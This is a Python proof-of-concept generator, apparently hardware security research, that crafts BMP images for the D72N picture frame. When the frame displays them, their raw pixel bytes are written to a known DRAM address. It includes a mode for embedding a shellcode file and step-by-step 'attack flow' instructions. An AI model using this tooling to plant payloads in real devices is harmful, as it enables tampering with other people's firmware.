#!/usr/bin/env python3
"""
D72N BMP Proof-of-Concept Generator
=====================================

Generates a BMP file that when displayed on the D72N picture frame,
writes a known pattern to DRAM. This proves the memory write primitive.

ZERO DEPENDENCIES - Works on Windows, macOS, Linux with stock Python 3.

Attack Flow:
  1. This script generates exploit.bmp with embedded pattern
  2. Copy exploit.bmp to SD card
  3. Insert SD card into D72N
  4. Start slideshow or view the BMP
  5. D72N decodes BMP -> pattern written to DRAM 0x100000+
  6. (Optional) Use SERDB to verify pattern in memory

Traced from D72N firmware:
  - BMP command: 0x10 at mailbox 0x40BC
  - Decode buffer: 0x100000 (primary), 0x0C0000 (secondary)
  - MB_BMP_CMD_DECODE_MEM_OUT at AEON 0x4CFFC
  - Pixel data written UNCOMPRESSED to DRAM

Usage:
    python d72n_poc_bmp.py                    # Create default PoC BMP
    python d72n_poc_bmp.py -o mytest.bmp      # Custom output name
    python d72n_poc_bmp.py --marker CAFEBABE  # Custom marker pattern
    python d72n_poc_bmp.py --shellcode sc.bin # Embed shellcode file
    python d72n_poc_bmp.py --analyze test.bmp # Analyze existing BMP

Author: Security research tool for D72N picture frame
"""

import argparse
import struct
import sys
import os

# Display dimensions for D72N (480x234 typical for 7" frame)
DEFAULT_WIDTH = 480
DEFAULT_HEIGHT = 234

# Marker patterns - easy to find in memory dumps
MARKER_DEADBEEF = bytes.fromhex('DEADBEEF')
MARKER_CAFEBABE = bytes.fromhex('CAFEBABE')
MARKER_D72N = b'D72N'


def create_bmp_header(width, height, bpp=24):
    """Create standard BMP file header + DIB header.

    Args:
        width: Image width in pixels
        height: Image height (positive = bottom-up, negative = top-down)
        bpp: Bits per pixel (24 = RGB, no palette)

    Returns:
        bytes: 54-byte BMP header
    """
    # Row size must be 4-byte aligned
    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    image_size = row_size * abs(height)
    file_size = 54 + image_size

    header = bytearray(54)

    # BMP File Header (14 bytes)
    header[0:2] = b'BM'                              # Magic
    struct.pack_into('<I', header, 2, file_size)     # File size
    struct.pack_into('<HH', header, 6, 0, 0)         # Reserved
    struct.pack_into('<I', header, 10, 54)           # Pixel data offset

    # DIB Header - BITMAPINFOHEADER (40 bytes)
    struct.pack_into('<I', header, 14, 40)           # Header size
    struct.pack_into('<i', header, 18, width)        # Width (signed)
    struct.pack_into('<i', header, 22, height)       # Height (signed)
    struct.pack_into('<H', header, 26, 1)            # Color planes
    struct.pack_into('<H', header, 28, bpp)          # Bits per pixel
    struct.pack_into('<I', header, 30, 0)            # Compression (0 = none)
    struct.pack_into('<I', header, 34, image_size)   # Image size
    struct.pack_into('<I', header, 38, 2835)         # X pixels/meter (72 DPI)
    struct.pack_into('<I', header, 42, 2835)         # Y pixels/meter
    struct.pack_into('<I', header, 46, 0)            # Colors in palette
    struct.pack_into('<I', header, 50, 0)            # Important colors

    return bytes(header)


def create_poc_bmp(width=DEFAULT_WIDTH, height=DEFAULT_HEIGHT,
                   marker=MARKER_DEADBEEF, fill_color=(0x41, 0x41, 0x41)):
    """Create BMP with embedded marker pattern.

    The marker is repeated throughout the pixel data so it's easy
    to find in a memory dump after the BMP is displayed.

    Args:
        width: Image width
        height: Image height
        marker: Bytes pattern to embed (e.g., DEADBEEF)
        fill_color: RGB tuple for visible fill color

    Returns:
        bytes: Complete BMP file
    """
    bpp = 24
    bytes_per_pixel = 3
    row_size = ((width * bytes_per_pixel + 3) // 4) * 4
    padding = row_size - (width * bytes_per_pixel)

    # Build pixel data with embedded markers
    pixel_data = bytearray()

    for y in range(abs(height)):
        row = bytearray()
        for x in range(width):
            # Embed marker pattern in specific pixels
            if x < len(marker):
                # First pixels contain marker bytes as B,G,R
                idx = x % len(marker)
                row.extend([marker[idx], marker[idx], marker[idx]])
            elif x >= width - len(marker):
                # Last pixels also contain marker
                idx = (width - 1 - x) % len(marker)
                row.extend([marker[idx], marker[idx], marker[idx]])
            else:
                # Fill with visible color (BGR order)
                row.extend([fill_color[2], fill_color[1], fill_color[0]])

        # Add row padding
        row.extend(b'\x00' * padding)
        pixel_data.extend(row)

    header = create_bmp_header(width, height, bpp)
    return header + bytes(pixel_data)


def create_pattern_bmp(width=DEFAULT_WIDTH, height=DEFAULT_HEIGHT,
                       pattern=MARKER_DEADBEEF):
    """Create BMP with repeating pattern throughout.

    The entire image is filled with the pattern, making it very
    easy to verify memory writes via SERDB.

    Args:
        width: Image width
        height: Image height
        pattern: Bytes to repeat

    Returns:
        bytes: Complete BMP file
    """
    bpp = 24
    bytes_per_pixel = 3
    row_size = ((width * bytes_per_pixel + 3) // 4) * 4
    image_size = row_size * abs(height)

    # Create pixel data with repeating pattern
    pixel_data = bytearray(image_size)
    for i in range(image_size):
        pixel_data[i] = pattern[i % len(pattern)]

    header = create_bmp_header(width, height, bpp)
    return header + bytes(pixel_data)


def create_shellcode_bmp(shellcode, width=64, nop_byte=0x00):
    """Create BMP with shellcode embedded in pixel data.

    Since BMP pixel data is written UNCOMPRESSED to DRAM,
    shellcode bytes become memory contents directly.

    Args:
        shellcode: bytes of shellcode to embed
        width: Image width (affects row alignment)
        nop_byte: Padding byte (0x00 = safe, 0x90 = x86 NOP)

    Returns:
        bytes: Complete BMP file
    """
    bpp = 24
    bytes_per_pixel = 3
    row_size = ((width * bytes_per_pixel + 3) // 4) * 4

    # Calculate height needed
    height = (len(shellcode) + row_size - 1) // row_size
    if height < 1:
        height = 1

    image_size = row_size * height

    # Create pixel data with shellcode
    pixel_data = bytearray(image_size)

    # Copy shellcode
    pixel_data[:len(shellcode)] = shellcode

    # Fill remainder with NOP-like byte
    for i in range(len(shellcode), image_size):
        pixel_data[i] = nop_byte

    # Add header marker so we know where shellcode starts
    header_marker = b'D72N_SC_'
    if len(shellcode) > len(header_marker):
        pass  # Shellcode is first, header after

    header = create_bmp_header(width, height, bpp)
    return header + bytes(pixel_data)


def analyze_bmp(filepath):
    """Analyze a BMP file and display exploit-relevant info.

    Args:
        filepath: Path to BMP file
    """
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
    except IOError as e:
        print(f"[-] Error reading file: {e}")
        return False

    if len(data) < 54:
        print("[-] File too small for BMP header")
        return False

    if data[:2] != b'BM':
        print("[-] Not a BMP file (missing 'BM' magic)")
        return False

    # Parse header
    file_size = struct.unpack('<I', data[2:6])[0]
    data_offset = struct.unpack('<I', data[10:14])[0]
    header_size = struct.unpack('<I', data[14:18])[0]
    width = struct.unpack('<i', data[18:22])[0]
    height = struct.unpack('<i', data[22:26])[0]
    bpp = struct.unpack('<H', data[28:30])[0]
    compression = struct.unpack('<I', data[30:34])[0]
    image_size = struct.unpack('<I', data[34:38])[0]

    print("=" * 60)
    print("D72N BMP Analysis")
    print("=" * 60)
    print(f"File:            {filepath}")
    print(f"File size:       {len(data)} bytes (header claims {file_size})")
    print(f"Dimensions:      {width} x {height}")
    print(f"Bits/pixel:      {bpp}")
    print(f"Compression:     {compression} (0=none)")
    print(f"Pixel offset:    {data_offset}")
    print(f"Image size:      {image_size}")
    print()

    # Check exploit indicators
    print("Exploit Analysis:")

    if compression == 0:
        print("  [+] No compression - pixels write directly to DRAM")
    else:
        print(f"  [-] Compression {compression} - data transformed during decode")

    if height < 0:
        print(f"  [!] Negative height ({height}) - top-down BMP")

    bytes_per_row = ((width * (bpp // 8) + 3) // 4) * 4
    expected_size = bytes_per_row * abs(height)
    actual_size = len(data) - data_offset

    print(f"  [*] Row size: {bytes_per_row} bytes (4-byte aligned)")
    print(f"  [*] Expected pixel data: {expected_size} bytes")
    print(f"  [*] Actual pixel data: {actual_size} bytes")

    if actual_size < expected_size:
        print(f"  [!] TRUNCATED - {expected_size - actual_size} bytes missing")

    # Check for marker patterns
    pixel_data = data[data_offset:]
    markers = [
        ('DEADBEEF', bytes.fromhex('DEADBEEF')),
        ('CAFEBABE', bytes.fromhex('CAFEBABE')),
        ('D72N', b'D72N'),
        ('D72N_SC_', b'D72N_SC_'),
    ]

    print()
    print("Marker Search:")
    for name, pattern in markers:
        idx = pixel_data.find(pattern)
        if idx >= 0:
            print(f"  [+] Found {name} at pixel offset 0x{idx:04X}")

    # Show first 64 bytes of pixel data
    print()
    print("First 64 bytes of pixel data:")
    hex_line = ' '.join(f'{b:02X}' for b in pixel_data[:64])
    print(f"  {hex_line}")

    # Show as potential DRAM address
    print()
    print("When displayed on D72N:")
    print(f"  Pixels will be written to DRAM starting at 0x100000")
    print(f"  Total write size: {actual_size} bytes")
    print(f"  Write ends at: 0x{0x100000 + actual_size:06X}")

    return True


def main():
    parser = argparse.ArgumentParser(
        description='D72N BMP Proof-of-Concept Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Create PoC BMP with DEADBEEF marker
    python d72n_poc_bmp.py -o poc.bmp

    # Create BMP with custom marker
    python d72n_poc_bmp.py --marker CAFEBABE -o test.bmp

    # Create full-pattern BMP (entire image is the pattern)
    python d72n_poc_bmp.py --full-pattern --marker D72NTEST -o full.bmp

    # Create BMP with shellcode from file
    python d72n_poc_bmp.py --shellcode payload.bin -o exploit.bmp

    # Analyze existing BMP
    python d72n_poc_bmp.py --analyze suspicious.bmp

Attack Flow:
    1. Generate: python d72n_poc_bmp.py -o poc.bmp
    2. Copy poc.bmp to SD card
    3. Insert SD into D72N picture frame
    4. View image or start slideshow
    5. BMP decoded -> pattern written to DRAM 0x100000
    6. Verify with SERDB: python d72n_serdb.py /dev/i2c-1 --read 0x100000 64

Memory Layout After Display:
    0x100000: Start of decoded BMP pixel data
    0x100000+: Your marker/shellcode bytes

This works because D72N uses MB_BMP_CMD_DECODE_MEM_OUT which writes
uncompressed pixel data directly to DRAM buffer at 0x100000.
        """
    )

    # Mode selection
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument('--analyze', '-a', metavar='FILE',
                      help='Analyze existing BMP file')
    mode.add_argument('--shellcode', '-s', metavar='FILE',
                      help='Embed shellcode from file')
    mode.add_argument('--full-pattern', '-f', action='store_true',
                      help='Fill entire image with pattern')

    # Options
    parser.add_argument('--marker', '-m', default='DEADBEEF',
                        help='Hex marker pattern (default: DEADBEEF)')
    parser.add_argument('--width', '-W', type=int, default=DEFAULT_WIDTH,
                        help=f'Image width (default: {DEFAULT_WIDTH})')
    parser.add_argument('--height', '-H', type=int, default=DEFAULT_HEIGHT,
                        help=f'Image height (default: {DEFAULT_HEIGHT})')
    parser.add_argument('-o', '--output', default='d72n_poc.bmp',
                        help='Output filename (default: d72n_poc.bmp)')

    args = parser.parse_args()

    # Handle analyze mode
    if args.analyze:
        success = analyze_bmp(args.analyze)
        return 0 if success else 1

    # Parse marker
    try:
        if args.marker.startswith('0x'):
            args.marker = args.marker[2:]
        # Allow text markers like "D72N"
        try:
            marker = bytes.fromhex(args.marker)
        except ValueError:
            marker = args.marker.encode('ascii')
    except Exception as e:
        print(f"[-] Invalid marker: {e}")
        return 1

    # Generate BMP
    if args.shellcode:
        try:
            with open(args.shellcode, 'rb') as f:
                shellcode = f.read()
            print(f"[*] Loaded {len(shellcode)} bytes of shellcode from {args.shellcode}")
            bmp_data = create_shellcode_bmp(shellcode, width=args.width)
            print(f"[+] Created shellcode BMP ({len(bmp_data)} bytes)")
        except IOError as e:
            print(f"[-] Error reading shellcode: {e}")
            return 1
    elif args.full_pattern:
        bmp_data = create_pattern_bmp(args.width, args.height, marker)
        print(f"[+] Created full-pattern BMP ({len(bmp_data)} bytes)")
        print(f"    Pattern: {marker.hex().upper()}")
    else:
        bmp_data = create_poc_bmp(args.width, args.height, marker)
        print(f"[+] Created PoC BMP ({len(bmp_data)} bytes)")
        print(f"    Marker: {marker.hex().upper()}")

    # Save
    try:
        with open(args.output, 'wb') as f:
            f.write(bmp_data)
        print(f"[+] Saved to: {args.output}")
    except IOError as e:
        print(f"[-] Error writing file: {e}")
        return 1

    # Show next steps
    print()
    print("Next Steps:")
    print(f"  1. Copy {args.output} to SD card")
    print("  2. Insert SD card into D72N picture frame")
    print("  3. View the image or start slideshow")
    print("  4. Image decoded -> pixels written to DRAM 0x100000")
    print()
    print("Verify with SERDB (Linux with I2C):")
    print("  python d72n_serdb.py /dev/i2c-1 --read 0x100000 64")
    print()
    print("Or dump and search:")
    print("  python d72n_dump_dram.py /dev/i2c-1 --range 0x100000 0x100")

    # Also analyze what we created
    print()
    analyze_bmp(args.output)

    return 0


if __name__ == '__main__':
    sys.exit(main())
